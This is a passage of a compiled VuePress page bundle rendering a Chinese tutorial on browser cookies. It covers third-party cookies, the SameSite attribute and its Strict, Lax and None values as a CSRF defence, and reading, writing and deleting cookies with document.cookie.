punctuation"}},[t._v('"')]),t._v("hidden"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("name")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("token"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("value")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("dad3weg34"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n  ...\n"),e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("</")]),t._v("form")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),e("p",[t._v("这种第三方网站引导而附带发送的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。比如，Facebook 在第三方网站插入一张看不见的图片。")]),t._v(" "),e("div",{staticClass:"language-html extra-class"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token tag"}},[e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("<")]),t._v("img")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("src")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),t._v("facebook.com"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])]),t._v(" "),e("span",{pre:!0,attrs:{class:"token special-attr"}},[e("span",{pre:!0,attrs:{class:"token attr-name"}},[t._v("style")]),e("span",{pre:!0,attrs:{class:"token attr-value"}},[e("span",{pre:!0,attrs:{class:"token punctuation attr-equals"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')]),e("span",{pre:!0,attrs:{class:"token value css language-css"}},[e("span",{pre:!0,attrs:{class:"token property"}},[t._v("visibility")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v("hidden"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v('"')])])]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(">")])]),t._v("\n")])])]),e("p",[t._v("浏览器加载上面代码时，就会向 Facebook 发出带有 Cookie 的请求，从而 Facebook 就会知道你是谁，访问了什么网站。")]),t._v(" "),e("p",[t._v("Cookie 的"),e("code",[t._v("SameSite")]),t._v("属性用来限制第三方 Cookie，从而减少安全风险。它可以设置三个值。")]),t._v(" "),e("blockquote",[e("ul",[e("li",[t._v("Strict")]),t._v(" "),e("li",[t._v("Lax")]),t._v(" "),e("li",[t._v("None")])])]),t._v(" "),e("p",[e("strong",[t._v("（1）Strict")])]),t._v(" "),e("p",[e("code",[t._v("Strict")]),t._v("最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。")]),t._v(" "),e("div",{staticClass:"language-http extra-class"},[e("pre",{pre:!0,attrs:{class:"language-http"}},[e("code",[e("span",{pre:!0,attrs:{class:"token header"}},[e("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("Set-Cookie")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(":")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token header-value"}},[t._v("CookieName=CookieValue; SameSite=Strict;")])]),t._v("\n")])])]),e("p",[t._v("这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。")]),t._v(" "),e("p",[e("strong",[t._v("（2）Lax")])]),t._v(" "),e("p",[e("code",[t._v("Lax")]),t._v("规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。")]),t._v(" "),e("div",{staticClass:"language-html extra-class"},[e("pre",{pre:!0,attrs:{class:"language-html"}},[e("code",[t._v("Set-Cookie: CookieName=CookieValue; SameSite=Lax;\n")])])]),e("p",[t._v("导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[t._v("请求类型")]),t._v(" "),e("th",{staticStyle:{"text-align":"center"}},[t._v("示例")]),t._v(" "),e("th",{staticStyle:{"text-align":"right"}},[t._v("正常情况")]),t._v(" "),e("th",[t._v("Lax")])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("链接")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('<a href="..."></a>')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("发送 Cookie")])]),t._v(" "),e("tr",[e("td",[t._v("预加载")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('<link rel="prerender" href="..."/>')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("发送 Cookie")])]),t._v(" "),e("tr",[e("td",[t._v("GET 表单")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('<form method="GET" action="...">')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("发送 Cookie")])]),t._v(" "),e("tr",[e("td",[t._v("POST 表单")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('<form method="POST" action="...">')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("不发送")])]),t._v(" "),e("tr",[e("td",[t._v("iframe")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('<iframe src="..."></iframe>')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("不发送")])]),t._v(" "),e("tr",[e("td",[t._v("AJAX")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('$.get("...")')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("不发送")])]),t._v(" "),e("tr",[e("td",[t._v("Image")]),t._v(" "),e("td",{staticStyle:{"text-align":"center"}},[e("code",[t._v('<img src="...">')])]),t._v(" "),e("td",{staticStyle:{"text-align":"right"}},[t._v("发送 Cookie")]),t._v(" "),e("td",[t._v("不发送")])])])]),t._v(" "),e("p",[t._v("设置了"),e("code",[t._v("Strict")]),t._v("或"),e("code",[t._v("Lax")]),t._v("以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。")]),t._v(" "),e("p",[e("strong",[t._v("（3）None")])]),t._v(" "),e("p",[t._v("Chrome 计划将"),e("code",[t._v("Lax")]),t._v("变为默认设置。这时，网站可以选择显式关闭"),e("code",[t._v("SameSite")]),t._v("属性，将其设为"),e("code",[t._v("None")]),t._v("。不过，前提是必须同时设置"),e("code",[t._v("Secure")]),t._v("属性（Cookie 只能通过 HTTPS 协议发送），否则无效。")]),t._v(" "),e("p",[t._v("下面的设置无效。")]),t._v(" "),e("div",{staticClass:"language-text extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("Set-Cookie: widget_session=abc123; SameSite=None\n")])])]),e("p",[t._v("下面的设置有效。")]),t._v(" "),e("div",{staticClass:"language-text extra-class"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("Set-Cookie: widget_session=abc123; SameSite=None; Secure\n")])])]),e("h2",{attrs:{id:"document-cookie"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#document-cookie"}},[t._v("#")]),t._v(" document.cookie")]),t._v(" "),e("p",[e("code",[t._v("document.cookie")]),t._v("属性用于读写当前网页的 Cookie。")]),t._v(" "),e("p",[t._v("读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有"),e("code",[t._v("HTTPOnly")]),t._v("属性。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v('// "foo=bar;baz=bar"')]),t._v("\n")])])]),e("p",[t._v("上面代码从"),e("code",[t._v("document.cookie")]),t._v("一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" cookies "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("split")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("';'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n\n"),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("for")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("var")]),t._v(" i "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" i "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v(" cookies"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("length"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v(" i"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("++")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),t._v("\n  console"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("log")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("cookies"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),t._v("i"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// foo=bar")]),t._v("\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// baz=bar")]),t._v("\n")])])]),e("p",[e("code",[t._v("document.cookie")]),t._v("属性是可写的，可以通过它为当前网站添加 Cookie。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'fontSize=14'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),e("p",[t._v("写入的时候，Cookie 的值必须写成"),e("code",[t._v("key=value")]),t._v("的形式。注意，等号两边不能有空格。另外，写入 Cookie 的时候，必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用"),e("code",[t._v("encodeURIComponent")]),t._v("方法达到。")]),t._v(" "),e("p",[t._v("但是，"),e("code",[t._v("document.cookie")]),t._v("一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'test1=hello'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\ndocument"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'test2=world'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\ndocument"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[t._v("// test1=hello;test2=world")]),t._v("\n")])])]),e("p",[e("code",[t._v("document.cookie")]),t._v("读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，"),e("code",[t._v("Cookie")]),t._v("字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，"),e("code",[t._v("Set-Cookie")]),t._v("字段是一行设置一个 Cookie。")]),t._v(" "),e("p",[t._v("写入 Cookie 的时候，可以一起写入 Cookie 的属性。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v('"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT"')]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),e("p",[t._v("上面代码中，写入 Cookie 的时候，同时设置了"),e("code",[t._v("expires")]),t._v("属性。属性值的等号两边，也是不能有空格的。")]),t._v(" "),e("p",[t._v("各个属性的写入注意点如下。")]),t._v(" "),e("ul",[e("li",[e("code",[t._v("path")]),t._v("属性必须为绝对路径，默认为当前路径。")]),t._v(" "),e("li",[e("code",[t._v("domain")]),t._v("属性值必须是当前发送 Cookie 的域名的一部分。比如，当前域名是"),e("code",[t._v("example.com")]),t._v("，就不能将其设为"),e("code",[t._v("foo.com")]),t._v("。该属性默认为当前的一级域名（不含二级域名）。")]),t._v(" "),e("li",[e("code",[t._v("max-age")]),t._v("属性的值为秒数。")]),t._v(" "),e("li",[e("code",[t._v("expires")]),t._v("属性的值为 UTC 格式，可以使用"),e("code",[t._v("Date.prototype.toUTCString()")]),t._v("进行日期格式转换。")])]),t._v(" "),e("p",[e("code",[t._v("document.cookie")]),t._v("写入 Cookie 的例子如下。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'fontSize=14; '")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'expires='")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" someDate"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("toGMTString")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'; '")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'path=/subdirectory; '")]),t._v("\n  "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("+")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'domain=*.example.com'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),e("p",[t._v("Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。")]),t._v(" "),e("p",[t._v("删除一个现存 Cookie 的唯一方法，是设置它的"),e("code",[t._v("expires")]),t._v("属性为一个过去的日期。")]),t._v(" "),e("div",{staticClass:"language-javascript extra-class"},[e("pre",{pre:!0,attrs:{class:"language-javascript"}},[e("code",[t._v("document"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),t._v("cookie "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[t._v("'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT'")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])])]),e("p",[t._v("上面代码中，名为"),e("code",[t._v("fontSize")]),t._v("的 Cookie 的值为空，过期时间设为1970年1月1月零点，就等同于删除了这个 Cookie。")]),t._v(" "),e("h2",{attrs:{id:"参考链接"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#参考链接"}},[t._v("#")]),t._v(" 参考链接")]),t._v(" "),e("ul",[e("li",[e("a",{attrs:{href:"https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies",target:"_blank",rel:"noopener noreferrer"}},[t._v("HTTP cookies"),e("OutboundLink")],1),t._v(", by MDN")]),t._v(" "),e("li",[e("a",{attrs:{href:"https://www.netsparker.com/blog/web-security/same-site-cookie-attribute-prevent-cross-site-request-forgery/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Using the Same-Site Cookie Attribute to Prevent CSRF Attacks"),e("OutboundLink")],1)]),t._v(" "),e("li",[e("a",{attrs:{href:"https://web.dev/samesite-cookies-explained",target:"_blank",rel:"noopener noreferrer"}},[t._v("SameSite cookies explained"),e("OutboundLink")],1)]),t._v(" "),e("li",[e("a",{attrs:{href:"https://scotthelme.co.uk/tough-cookies/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Tough Cookies"),e("OutboundLink")],1),t._v(", Scott Helme")]),t._v(" "),e("li",[e("a",{attrs:{href:"https://scotthelme.co.uk/csrf-is-dead/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Cross-Site Request Forgery is dead!"),e("OutboundLink")],1),t._v(", Scott Helme")])])])}),[],!1,null,null,null);e.default=o.exports}}]);